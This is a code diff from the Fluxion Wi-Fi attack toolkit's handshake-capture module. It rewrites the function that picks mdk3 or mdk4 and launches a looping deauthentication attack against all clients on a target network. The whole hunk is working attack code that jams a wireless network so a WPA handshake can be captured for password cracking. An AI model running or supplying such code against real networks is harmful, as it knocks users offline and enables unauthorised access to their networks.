@@ -183,11 +183,18 @@ handshake_snooper_start_deauthenticator() {
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk3MethodOption")
-      if hash mdk4; then DEAUTH="mkd4"; else DEAUTH="mdk3";fi
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 $DEAUTH $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
+        if ! [ -x "$(command -v mdk4)" ];then
+            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+                "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
+            HandshakeSnooperDeauthenticatorPID=$!
+        else
+            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
+            HandshakeSnooperDeauthenticatorPID=$!
+        fi
+
     ;;
   esac
 }
